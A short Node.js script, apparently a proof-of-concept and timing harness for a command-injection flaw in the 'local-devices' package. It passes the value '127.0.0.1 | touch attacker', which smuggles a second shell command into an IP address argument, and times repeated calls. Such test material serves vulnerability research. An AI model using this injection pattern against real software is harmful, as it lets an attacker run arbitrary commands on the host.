
    var arguments = process.argv;
    if (arguments.length == 3) {
        type = arguments[2];
        var time1 = process.hrtime.bigint();
        for (var i = 0; i < 100000; i++){
        try{
               const find = require('local-devices');
           
           // var userInput = '';
           var userInput = '127.0.0.1 | touch attacker';
           find(userInput);
               
 } catch(e){}
        }      
        var time2 = process.hrtime.bigint();
        console.log(`${type}_time: ${time2-time1}`); 
        require("fs").writeFileSync(`${type}_time`, (time2-time1).toString()); 
    } else{
       const find = require('local-devices');
   
   // var userInput = '';
   var userInput = '127.0.0.1 | touch attacker';
   find(userInput);
       

    }